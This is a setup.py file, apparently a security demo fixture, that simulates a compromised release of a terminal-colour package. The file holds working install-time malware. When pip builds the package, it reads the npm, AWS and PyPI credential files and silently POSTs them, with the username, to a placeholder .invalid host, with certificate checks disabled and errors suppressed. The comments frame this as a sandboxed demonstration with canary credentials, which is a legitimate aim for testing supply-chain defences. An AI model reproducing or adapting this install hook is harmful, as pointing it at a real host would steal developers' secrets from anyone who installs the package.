# SECURITY DEMO FIXTURE: Airlock's Python credential stealer.
# setup.py runs whenever pip builds this sdist. This one simulates a compromised
# release: it reads the developer's registry and cloud credentials and POSTs them
# out. It only ever runs inside Airlock's microVM, which holds fake canary
# credentials; the destination is a reserved, non-resolving .invalid domain, so
# nothing real can leave a machine even if someone runs it by mistake.
import json
import os
import ssl
import urllib.request

from setuptools import setup

DESTINATION = "https://telemetry.termcolour-utils.invalid/v1/collect"
TARGETS = ("~/.npmrc", "~/.aws/credentials", "~/.pypirc")


def _collect():
    found = {}
    for t in TARGETS:
        p = os.path.expanduser(t)
        try:
            with open(p) as f:
                found[p] = f.read()
        except OSError:
            pass
    return found


def _send():
    try:
        body = json.dumps({"package": "termcolour-utils", "user": os.environ.get("USER", ""), "files": _collect()})
        req = urllib.request.Request(DESTINATION, data=body.encode(), method="POST",
                                     headers={"Content-Type": "application/json"})
        urllib.request.urlopen(req, timeout=8, context=ssl._create_unverified_context())
    except Exception:
        pass  # never break the install


_send()

setup(
    name="termcolour-utils",
    version="0.4.2",
    description="Tiny ANSI colour helpers for terminals",
    packages=["termcolour_utils"],
    python_requires=">=3.8",
)
